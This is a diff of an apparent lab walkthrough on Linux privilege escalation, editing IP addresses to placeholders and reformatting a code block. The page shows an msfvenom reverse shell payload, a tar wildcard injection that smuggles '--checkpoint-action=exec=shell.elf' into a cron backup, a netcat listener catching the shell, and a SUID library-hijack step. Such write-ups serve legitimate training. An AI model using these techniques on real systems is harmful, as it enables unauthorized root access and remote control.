@@ -314,7 +314,7 @@ cd /home/user
 tar czf /tmp/backup.tar.gz *{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Using `msfvenom` create a reverse shell payload.
-{% capture code %}{% raw %}msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.180.89 LPORT=443 -f elf -o shell.elf{% endraw %}{% endcapture %} {% include code.html code=code %}
+{% capture code %}{% raw %}msfvenom -p linux/x64/shell_reverse_tcp LHOST=<source-ip> LPORT=443 -f elf -o shell.elf{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 The output will be similar to
 {% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -332,7 +332,7 @@ touch /home/user/--checkpoint-action=exec=shell.elf{% endraw %}{% endcapture %} 
 
 Create a netcat listener using `rlwrap -cAr nc -lnvp 443`, and when cron runs, `reverse shell` will be spawned.
 {% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443)
-Connection from 10.10.208.200 45211 received!
+Connection from <target-ip> 45211 received!
 bash: no job control in this shell{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
@@ -394,7 +394,10 @@ From the previous `suid` output, the file `/usr/local/bin/suid-so` can be tried 
 [=====================================================================>] 99 %
 Done.{% endraw %}{% endcapture %} {% include code.html code=code %}
 
-The binary can be debugged to find any missing libraries or links using `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open | access | no such file"`.
+The binary can be debugged to find any missing libraries or links using
+{% capture code %}{% raw %}strace /usr/local/bin/suid-so 2>&1 | grep -iE "open | access | no such file"`{% endraw %}{% endcapture %} {% include code.html code=code %}
+
+The output will be similar to
 {% capture code %}{% raw %}access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
 access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
 access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
